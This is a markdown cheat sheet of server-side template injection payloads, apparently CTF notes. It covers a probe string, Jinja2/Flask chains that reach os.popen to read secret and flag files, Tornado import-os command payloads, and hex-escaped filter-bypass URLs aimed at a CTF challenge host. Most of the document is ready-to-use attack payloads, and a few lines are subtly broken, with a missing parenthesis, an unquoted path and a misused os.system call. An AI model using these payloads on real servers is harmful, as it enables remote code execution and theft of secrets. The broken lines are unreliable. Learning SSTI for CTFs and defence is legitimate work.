### Server Side Template Injection

---

Server side template injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server (Server-side).

Testing - `${{<%[%'"}}%\` use to check if any error occurs.
If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist.

![image](https://github.com/user-attachments/assets/4408a527-a6be-4540-bdee-8bc9f419753f)

[Portswigger](https://portswigger.net/web-security/server-side-template-injection/exploiting)  

Example of a vulnerability : 

```py
{{5*5}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

---

#### Flask payload for Jinja2 : 
#### Config objects

The current configuration object : flask.config

Start with payload : `{{config.items()}}`
Then inject the second payload : `{{config.from_object('os')}}


```py
{{config.__class__.__init__.__globals__['os'].popen('cat flaskr/protected/burdellsecrets.txt').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /home/ctf/flag.txt').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
{{config}}
{%with a="Hello World"%}
{%print(a)%}
{%endwith}
{%with a=request|attr("application")|attr("__globals__")|attr(__getitem__)(__builtins__)|attr__getitem__)(__import__)("os")|attr("popen")("cat${IFS}flag.txt")|attr("read")()%}
```

---

#### Tornado payload

```py
{%import%20os%}{{os.popen("ls").read() }}
{% import os %}{{ os.popen("ls").read() }}
{{globals()}}
{% import os %}{{os.getcwd()}}
{% import os %}{{os.listdir(/home/tornado)}}
{% import os %}{{os.system(r"lookatme.txt")}}
{{help(object name)}}

```

```py
ctf payloads

http://chall.battlectf.online:8085/?capital={{%20().__class__.__base__.__subclasses__()[354](%22cat%20flag.txt%22,%20shell=True,%20stdout=-1).communicate()[0].strip()}}

SSTI with bypass
http://chall.battlectf.online:8086/?capital={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f%27)(%27os%27)|attr(%27\x70\x6f\x70\x65\x6e%27)(%27cat%20flag\x2etxt%27)|attr(%27read%27)()}}
```
